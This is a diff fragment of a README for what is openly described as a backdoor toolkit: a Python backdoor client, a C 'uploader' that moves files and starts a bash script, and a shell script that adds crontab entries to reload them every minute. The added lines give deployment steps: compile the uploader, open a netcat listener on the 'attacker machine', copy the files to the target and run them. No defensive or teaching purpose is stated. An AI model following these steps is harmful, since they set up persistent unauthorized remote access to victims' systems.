@@ -7,3 +7,10 @@ You can also change to your backdoor and your execution of it.
 Client.py - Backdoor  
 Auto.c -> C program for moving files and start bash script  
 Settings.sh -> Add rules in Crontab for autoload our programs in 1 minute  
+# Compile and Run   
+In Attacker machine:    
+--> gcc auto.c -o uploader    
+--> nc -nvlp (port)
+
+Transfer client.py,settings.sh, uploader    
+Run ./uploader  
